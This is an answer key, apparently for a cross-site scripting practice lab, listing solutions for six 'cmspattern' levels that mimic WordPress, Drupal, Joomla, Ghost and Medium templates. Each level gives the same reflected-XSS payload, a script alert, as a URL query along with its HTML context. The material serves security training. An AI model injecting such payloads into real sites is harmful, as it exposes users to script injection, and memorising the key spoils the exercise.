# cmspattern — solutions

Raw reflections mimicking CMS templates (WordPress / Drupal / Joomla / Ghost / Medium).

### cmspattern-level1

`/cmspattern/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: <h1 class="entry-title"> raw

### cmspattern-level2

`/cmspattern/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: <h3 class="widget-title"> raw

### cmspattern-level3

`/cmspattern/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: <p> raw inside Drupal field

### cmspattern-level4

`/cmspattern/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: <h3> raw inside moduletable

### cmspattern-level5

`/cmspattern/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: <p class="post-card-excerpt"> raw

### cmspattern-level6

`/cmspattern/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: <p> nested deep in article/section raw
